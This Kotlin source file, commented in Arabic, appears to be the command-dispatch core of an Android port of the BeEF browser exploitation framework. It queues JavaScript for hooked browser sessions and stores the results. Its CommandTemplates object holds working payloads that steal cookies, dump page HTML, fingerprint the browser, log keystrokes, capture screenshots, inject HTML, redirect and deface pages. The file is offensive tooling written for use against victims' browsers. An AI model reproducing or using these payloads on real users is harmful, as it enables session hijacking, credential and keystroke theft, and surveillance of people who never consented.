/**
 * Command Dispatcher - مُرسِل الأوامر
 * =====================================
 * 
 * يدير إرسال الأوامر للمتصفحات واستقبال النتائج
 */

package com.beef.engine.core

import org.json.JSONArray
import org.json.JSONObject
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * أمر للتنفيذ
 */
data class Command(
    val id: String = UUID.randomUUID().toString().take(8),
    val sid: String,
    val code: String,
    val createdAt: Long = System.currentTimeMillis(),
    var executedAt: Long? = null,
    var result: String? = null,
    var status: CommandStatus = CommandStatus.PENDING
)

enum class CommandStatus {
    PENDING,    // في الانتظار
    SENT,       // تم الإرسال
    EXECUTED,   // تم التنفيذ
    FAILED,     // فشل
    TIMEOUT     // انتهت المهلة
}

/**
 * مُرسِل الأوامر
 */
class CommandDispatcher {
    
    // قائمة الأوامر المعلقة لكل جلسة
    private val pendingCommands = ConcurrentHashMap<String, ConcurrentLinkedQueue<Command>>()
    
    // سجل جميع الأوامر
    private val commandHistory = ConcurrentLinkedQueue<Command>()
    
    // الحد الأقصى لحجم السجل
    private val maxHistorySize = 500
    
    // مهلة الأمر (دقيقة واحدة)
    private val commandTimeout = 60_000L
    
    /**
     * إضافة أمر للقائمة
     */
    fun queueCommand(sid: String, code: String): Command {
        val command = Command(sid = sid, code = code)
        
        pendingCommands
            .getOrPut(sid) { ConcurrentLinkedQueue() }
            .add(command)
        
        addToHistory(command)
        
        android.util.Log.d("CommandDispatcher", "Queued command ${command.id} for $sid")
        return command
    }
    
    /**
     * الحصول على الأوامر المعلقة لجلسة
     */
    fun getPendingCommands(sid: String): List<String> {
        val queue = pendingCommands[sid] ?: return emptyList()
        val commands = mutableListOf<String>()
        
        while (queue.isNotEmpty()) {
            val command = queue.poll() ?: break
            command.status = CommandStatus.SENT
            commands.add(JSONObject().apply {
                put("id", command.id)
                put("code", command.code)
            }.toString())
        }
        
        return commands
    }
    
    /**
     * تحديد نتيجة أمر
     */
    fun setResult(commandId: String, result: String) {
        commandHistory.find { it.id == commandId }?.apply {
            this.result = result
            this.executedAt = System.currentTimeMillis()
            this.status = CommandStatus.EXECUTED
        }
        
        android.util.Log.d("CommandDispatcher", "Command $commandId result: ${result.take(50)}...")
    }
    
    /**
     * الحصول على أمر بالمعرف
     */
    fun getCommand(commandId: String): Command? {
        return commandHistory.find { it.id == commandId }
    }
    
    /**
     * الحصول على سجل الأوامر لجلسة
     */
    fun getHistory(sid: String): List<Command> {
        return commandHistory.filter { it.sid == sid }
    }
    
    /**
     * الحصول على جميع الأوامر
     */
    fun getAllHistory(): List<Command> {
        return commandHistory.toList()
    }
    
    /**
     * إضافة للسجل مع التحكم بالحجم
     */
    private fun addToHistory(command: Command) {
        commandHistory.add(command)
        while (commandHistory.size > maxHistorySize) {
            commandHistory.poll()
        }
    }
    
    /**
     * تنظيف الأوامر المنتهية المهلة
     */
    fun cleanupTimeouts() {
        val now = System.currentTimeMillis()
        commandHistory.forEach { command ->
            if (command.status == CommandStatus.PENDING || command.status == CommandStatus.SENT) {
                if (now - command.createdAt > commandTimeout) {
                    command.status = CommandStatus.TIMEOUT
                }
            }
        }
    }
    
    /**
     * عدد الأوامر المعلقة
     */
    fun pendingCount(): Int {
        return pendingCommands.values.sumOf { it.size }
    }
    
    /**
     * إجمالي الأوامر
     */
    fun totalCount(): Int = commandHistory.size
    
    /**
     * مسح السجل
     */
    fun clearHistory() {
        commandHistory.clear()
        pendingCommands.clear()
    }
    
    /**
     * التحويل لـ JSON
     */
    fun toJson(): String {
        return JSONArray(commandHistory.map { cmd ->
            JSONObject().apply {
                put("id", cmd.id)
                put("sid", cmd.sid)
                put("code", cmd.code.take(100))
                put("status", cmd.status.name)
                put("createdAt", cmd.createdAt)
                put("executedAt", cmd.executedAt)
                put("result", cmd.result?.take(200))
            }
        }).toString()
    }
}

/**
 * أوامر جاهزة للاستخدام
 */
object CommandTemplates {
    
    // استخراج Cookies
    val GET_COOKIES = """
        (function(){
            return document.cookie || 'No cookies';
        })();
    """.trimIndent()
    
    // استخراج HTML الصفحة
    val GET_PAGE_HTML = """
        (function(){
            return document.documentElement.outerHTML;
        })();
    """.trimIndent()
    
    // معلومات الصفحة
    val GET_PAGE_INFO = """
        (function(){
            return JSON.stringify({
                url: location.href,
                title: document.title,
                referrer: document.referrer,
                forms: document.forms.length,
                links: document.links.length,
                images: document.images.length
            });
        })();
    """.trimIndent()
    
    // بصمة المتصفح
    val GET_FINGERPRINT = """
        (function(){
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('BeEF', 2, 2);
            var canvasHash = canvas.toDataURL().slice(-50);
            
            return JSON.stringify({
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                canvasFingerprint: canvasHash
            });
        })();
    """.trimIndent()
    
    // Keylogger بسيط
    val KEYLOGGER = """
        (function(){
            if(window._beefKeylogger) return 'Already active';
            window._beefKeylogger = true;
            window._beefKeys = [];
            document.addEventListener('keydown', function(e) {
                window._beefKeys.push({
                    key: e.key,
                    target: e.target.tagName,
                    time: Date.now()
                });
            });
            return 'Keylogger activated';
        })();
    """.trimIndent()
    
    // استرجاع ضغطات المفاتيح
    val GET_KEYLOG = """
        (function(){
            var keys = window._beefKeys || [];
            window._beefKeys = [];
            return JSON.stringify(keys);
        })();
    """.trimIndent()
    
    // لقطة شاشة (يحتاج html2canvas)
    val SCREENSHOT = """
        (function(){
            if(typeof html2canvas === 'undefined') {
                var script = document.createElement('script');
                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
                script.onload = function() {
                    html2canvas(document.body).then(function(canvas) {
                        window._beefScreenshot = canvas.toDataURL('image/jpeg', 0.5);
                    });
                };
                document.head.appendChild(script);
                return 'Loading html2canvas...';
            }
            html2canvas(document.body).then(function(canvas) {
                window._beefScreenshot = canvas.toDataURL('image/jpeg', 0.5);
            });
            return 'Capturing...';
        })();
    """.trimIndent()
    
    // استرجاع لقطة الشاشة
    val GET_SCREENSHOT = """
        (function(){
            var img = window._beefScreenshot || null;
            window._beefScreenshot = null;
            return img || 'No screenshot available';
        })();
    """.trimIndent()
    
    // إعادة توجيه
    fun redirect(url: String) = "location.href='$url';"
    
    // حقن HTML
    fun injectHtml(html: String) = """
        (function(){
            var div = document.createElement('div');
            div.innerHTML = `$html`;
            document.body.appendChild(div);
            return 'Injected';
        })();
    """.trimIndent()
    
    // تنبيه
    fun alert(message: String) = "alert('$message');"
    
    // تعديل الصفحة
    fun deface(html: String) = "document.body.innerHTML = `$html`;"
}
